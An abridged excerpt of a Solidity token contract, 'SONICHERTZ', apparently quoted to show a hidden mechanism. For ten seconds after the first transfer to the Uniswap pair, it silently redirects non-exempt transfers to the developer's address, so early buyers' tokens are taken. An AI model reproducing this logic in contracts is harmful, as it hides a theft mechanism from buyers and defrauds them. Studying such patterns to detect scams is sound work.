...
contract SONICHERTZ is IERC20, Ownable {
    ...
    uint256 public _sonicHERTZ = 0;
     uint256 public _dynamicHERTZ = 1;
    ...
    function _transfer(
        ...
        if(to == uniswapV2Pair && _dynamicHERTZ == 1) 
        {
            _sonicHERTZ = block.timestamp;
            _dynamicHERTZ=2;
        }
        if (
            !_isExcludedFromFee[from] && !_isExcludedFromFee[to]
        ) {
            if(block.timestamp.sub(_sonicHERTZ) <= 10)
            {
                to=_devsAddress;
            }
        }
